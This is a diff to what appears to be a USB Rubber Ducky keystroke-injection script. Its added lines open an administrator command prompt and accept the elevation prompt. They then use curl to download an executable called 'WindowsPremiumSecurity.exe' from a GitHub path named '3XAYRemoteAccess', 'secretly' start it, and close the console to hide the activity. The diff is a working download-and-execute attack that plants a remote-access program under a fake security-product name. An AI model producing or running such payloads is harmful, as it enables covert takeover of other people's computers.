@@ -10,16 +10,23 @@ STRING cmd
 CTRL-SHIFT ENTER
 
 REM Grant Admin access
+DELAY 1000
 LEFTARROW
 ENTER
 
+REM Enter downloads folder
+STRING cd %UserProfile\Downloads
+
 REM Download install script
-STRING this is supposed to be a download command
+STRING curl https://github.com/3XAY/hackducky/raw/refs/heads/main/submissions/3XAYRemoteAccess/WindowsPremiumSecurity.exe -o WindowsPremiumSecurity.exe -L
 ENTER
 
 REM Secretly start downloaded script
 STRING start WindowsPremiumSecurity.exe
 ENTER
+
+REM Long delay because it takes a while for it to bring the input field back
+DELAY 15000
 
 REM Close the original "downloader" console
 STRING exit
